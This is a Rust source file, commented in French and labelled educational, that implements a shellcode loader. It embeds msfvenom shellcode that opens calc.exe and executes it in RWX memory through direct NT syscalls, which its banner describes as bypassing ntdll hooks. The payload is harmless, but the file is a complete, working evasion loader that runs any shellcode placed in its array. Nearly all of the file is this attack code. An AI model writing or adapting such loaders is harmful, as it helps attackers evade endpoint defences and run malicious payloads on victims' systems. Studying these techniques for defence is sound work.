/*
    ============================================================
    🦀 CALC LOADER - Educational Direct Syscall Shellcode Loader
    ============================================================
    
    Ce loader démontre les concepts suivants:
    1. Direct Syscalls via la librairie rust_syscalls
    2. Allocation mémoire RWX avec NtAllocateVirtualMemory
    3. Écriture en mémoire avec NtWriteVirtualMemory
    4. Création de thread avec NtCreateThreadEx
    5. Exécution de shellcode (calc.exe)
    
    ⚠️  USAGE ÉDUCATIF UNIQUEMENT - Pour comprendre les techniques
        utilisées par les malwares et mieux s'en défendre.
    
    Auteur: Educational Purpose
    Inspiré de: https://github.com/Whitecat18/Rust-for-Malware-Development
*/

use std::ptr::null_mut;
use rust_syscalls::syscall;
use winapi::ctypes::c_void;
use winapi::shared::ntdef::{NTSTATUS, NULL};
use winapi::shared::ntstatus::STATUS_SUCCESS;
use winapi::um::synchapi::WaitForSingleObject;
use winapi::um::winbase::INFINITE;
use winapi::um::handleapi::CloseHandle;

/// Shellcode pour lancer calc.exe (Windows x64)
/// Généré avec: msfvenom -p windows/x64/exec CMD=calc.exe -f rust
/// 
/// Ce shellcode fait:
/// 1. Trouve kernel32.dll via le PEB
/// 2. Résout WinExec dynamiquement
/// 3. Appelle WinExec("calc.exe", 0)
const CALC_SHELLCODE: [u8; 276] = [
    0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x00, 0x00, 0x41, 0x51,
    0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52,
    0x60, 0x48, 0x8b, 0x52, 0x18, 0x48, 0x8b, 0x52, 0x20, 0x48, 0x8b, 0x72,
    0x50, 0x48, 0x0f, 0xb7, 0x4a, 0x4a, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0,
    0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41,
    0x01, 0xc1, 0xe2, 0xed, 0x52, 0x41, 0x51, 0x48, 0x8b, 0x52, 0x20, 0x8b,
    0x42, 0x3c, 0x48, 0x01, 0xd0, 0x8b, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48,
    0x85, 0xc0, 0x74, 0x67, 0x48, 0x01, 0xd0, 0x50, 0x8b, 0x48, 0x18, 0x44,
    0x8b, 0x40, 0x20, 0x49, 0x01, 0xd0, 0xe3, 0x56, 0x48, 0xff, 0xc9, 0x41,
    0x8b, 0x34, 0x88, 0x48, 0x01, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0,
    0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0x38, 0xe0, 0x75, 0xf1,
    0x4c, 0x03, 0x4c, 0x24, 0x08, 0x45, 0x39, 0xd1, 0x75, 0xd8, 0x58, 0x44,
    0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0, 0x66, 0x41, 0x8b, 0x0c, 0x48, 0x44,
    0x8b, 0x40, 0x1c, 0x49, 0x01, 0xd0, 0x41, 0x8b, 0x04, 0x88, 0x48, 0x01,
    0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a, 0x41, 0x58, 0x41, 0x59,
    0x41, 0x5a, 0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0, 0x58, 0x41,
    0x59, 0x5a, 0x48, 0x8b, 0x12, 0xe9, 0x57, 0xff, 0xff, 0xff, 0x5d, 0x48,
    0xba, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8d, 0x8d,
    0x01, 0x01, 0x00, 0x00, 0x41, 0xba, 0x31, 0x8b, 0x6f, 0x87, 0xff, 0xd5,
    0xbb, 0xf0, 0xb5, 0xa2, 0x56, 0x41, 0xba, 0xa6, 0x95, 0xbd, 0x9d, 0xff,
    0xd5, 0x48, 0x83, 0xc4, 0x28, 0x3c, 0x06, 0x7c, 0x0a, 0x80, 0xfb, 0xe0,
    0x75, 0x05, 0xbb, 0x47, 0x13, 0x72, 0x6f, 0x6a, 0x00, 0x59, 0x41, 0x89,
    0xda, 0xff, 0xd5, 0x63, 0x61, 0x6c, 0x63, 0x2e, 0x65, 0x78, 0x65, 0x00,
];

/// Exécute le shellcode en utilisant des syscalls directs.
/// 
/// ## Flow d'exécution:
/// 
/// ```text
/// ┌─────────────────────────────────────────────────────────────┐
/// │  1. NtAllocateVirtualMemory                                 │
/// │     └─► Alloue de la mémoire RWX dans le processus courant  │
/// │                                                             │
/// │  2. NtWriteVirtualMemory                                    │
/// │     └─► Copie le shellcode dans la mémoire allouée          │
/// │                                                             │
/// │  3. NtCreateThreadEx                                        │
/// │     └─► Crée un thread qui exécute le shellcode             │
/// │                                                             │
/// │  4. WaitForSingleObject                                     │
/// │     └─► Attend la fin de l'exécution                        │
/// └─────────────────────────────────────────────────────────────┘
/// ```
fn execute_shellcode(shellcode: &[u8]) -> Result<(), String> {
    println!("[*] Calc Loader - Direct Syscalls Demo");
    println!("[*] Shellcode size: {} bytes", shellcode.len());
    
    unsafe {
        // Handle vers le processus courant (-1 = pseudo-handle)
        let h_process: *mut c_void = -1isize as *mut c_void;
        
        // =====================================================
        // ÉTAPE 1: Allouer de la mémoire RWX
        // =====================================================
        // NtAllocateVirtualMemory alloue de la mémoire dans un processus
        // 
        // Paramètres:
        //   - ProcessHandle: -1 pour le processus courant
        //   - BaseAddress: pointeur vers l'adresse (NULL = laisser le système choisir)
        //   - ZeroBits: 0 (pas de contrainte d'alignement)
        //   - RegionSize: taille à allouer
        //   - AllocationType: MEM_COMMIT | MEM_RESERVE (0x3000)
        //   - Protect: PAGE_EXECUTE_READWRITE (0x40)
        
        let mut base_address: *mut c_void = null_mut();
        let mut region_size: usize = shellcode.len();
        
        println!("[*] Calling NtAllocateVirtualMemory via direct syscall...");
        
        let status: NTSTATUS = syscall!(
            "NtAllocateVirtualMemory",
            h_process,                              // ProcessHandle
            &mut base_address as *mut _ as *mut _,  // BaseAddress
            0usize,                                 // ZeroBits
            &mut region_size as *mut usize,         // RegionSize
            0x3000u32,                              // MEM_COMMIT | MEM_RESERVE
            0x40u32                                 // PAGE_EXECUTE_READWRITE
        );
        
        if status != STATUS_SUCCESS {
            return Err(format!(
                "NtAllocateVirtualMemory failed with status: {:#X}", 
                status
            ));
        }
        
        println!("[+] Memory allocated at: {:p}", base_address);
        println!("[+] Region size: {} bytes", region_size);
        
        // =====================================================
        // ÉTAPE 2: Écrire le shellcode en mémoire
        // =====================================================
        // NtWriteVirtualMemory copie des données dans la mémoire d'un processus
        //
        // Paramètres:
        //   - ProcessHandle: handle du processus cible
        //   - BaseAddress: adresse destination
        //   - Buffer: données à écrire
        //   - NumberOfBytesToWrite: taille
        //   - NumberOfBytesWritten: bytes effectivement écrits
        
        let mut bytes_written: usize = 0;
        
        println!("[*] Calling NtWriteVirtualMemory via direct syscall...");
        
        let status: NTSTATUS = syscall!(
            "NtWriteVirtualMemory",
            h_process,                              // ProcessHandle
            base_address,                           // BaseAddress (destination)
            shellcode.as_ptr() as *const c_void,    // Buffer (source)
            shellcode.len(),                        // NumberOfBytesToWrite
            &mut bytes_written as *mut usize        // NumberOfBytesWritten
        );
        
        if status != STATUS_SUCCESS {
            return Err(format!(
                "NtWriteVirtualMemory failed with status: {:#X}", 
                status
            ));
        }
        
        println!("[+] Shellcode written: {} bytes", bytes_written);
        
        // =====================================================
        // ÉTAPE 3: Créer un thread pour exécuter le shellcode
        // =====================================================
        // NtCreateThreadEx crée un nouveau thread dans un processus
        //
        // Paramètres:
        //   - ThreadHandle: recevra le handle du thread créé
        //   - DesiredAccess: THREAD_ALL_ACCESS (0x1FFFFF)
        //   - ObjectAttributes: NULL
        //   - ProcessHandle: processus cible
        //   - StartRoutine: adresse de départ (notre shellcode)
        //   - Argument: paramètre passé au thread (NULL)
        //   - CreateFlags: 0 (démarrer immédiatement)
        //   - ZeroBits, StackSize, MaxStackSize, AttributeList: 0/NULL
        
        let mut thread_handle: *mut c_void = null_mut();
        
        println!("[*] Calling NtCreateThreadEx via direct syscall...");
        
        let status: NTSTATUS = syscall!(
            "NtCreateThreadEx",
            &mut thread_handle as *mut _ as *mut _,  // ThreadHandle
            0x1FFFFFu32,                             // THREAD_ALL_ACCESS
            NULL,                                     // ObjectAttributes
            h_process,                                // ProcessHandle
            base_address,                             // StartRoutine (shellcode)
            NULL,                                     // Argument
            0u32,                                     // CreateFlags (run immediately)
            0usize,                                   // ZeroBits
            0usize,                                   // StackSize (default)
            0usize,                                   // MaximumStackSize
            NULL                                      // AttributeList
        );
        
        if status != STATUS_SUCCESS {
            return Err(format!(
                "NtCreateThreadEx failed with status: {:#X}", 
                status
            ));
        }
        
        println!("[+] Thread created: {:p}", thread_handle);
        
        // =====================================================
        // ÉTAPE 4: Attendre la fin de l'exécution
        // =====================================================
        println!("[*] Waiting for shellcode execution...");
        
        WaitForSingleObject(thread_handle, INFINITE);
        
        // Cleanup
        CloseHandle(thread_handle);
        
        println!("[+] Execution complete!");
        
        Ok(())
    }
}

fn main() {
    println!(r#"
    ╔═══════════════════════════════════════════════════════════╗
    ║  🦀 CALC LOADER - Direct Syscall Shellcode Executor 🦀   ║
    ║                                                           ║
    ║  Educational tool to understand:                          ║
    ║  • Direct syscalls (bypassing ntdll hooks)                ║
    ║  • Memory allocation with NtAllocateVirtualMemory         ║
    ║  • Thread creation with NtCreateThreadEx                  ║
    ║                                                           ║
    ║  ⚠️  FOR EDUCATIONAL PURPOSES ONLY                        ║
    ╚═══════════════════════════════════════════════════════════╝
    "#);
    
    match execute_shellcode(&CALC_SHELLCODE) {
        Ok(_) => {
            println!("\n[✓] SUCCESS: Calculator should have appeared!");
        }
        Err(e) => {
            eprintln!("\n[✗] ERROR: {}", e);
            std::process::exit(1);
        }
    }
}
